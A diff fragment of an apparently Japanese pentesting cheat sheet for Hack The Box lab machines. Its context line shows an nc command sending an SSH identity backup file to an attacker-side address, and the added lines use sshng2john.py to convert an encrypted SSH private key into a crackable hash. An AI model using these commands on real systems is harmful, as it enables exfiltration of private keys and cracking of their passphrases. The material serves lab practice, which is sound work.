@@ -928,6 +928,14 @@ nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-ident
 
 ```
 
+- ssh のid_rsa が暗号化されてる時
+
+```
+
+python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
+
+```
+
 
 - Windows で user.txt を探したい
 
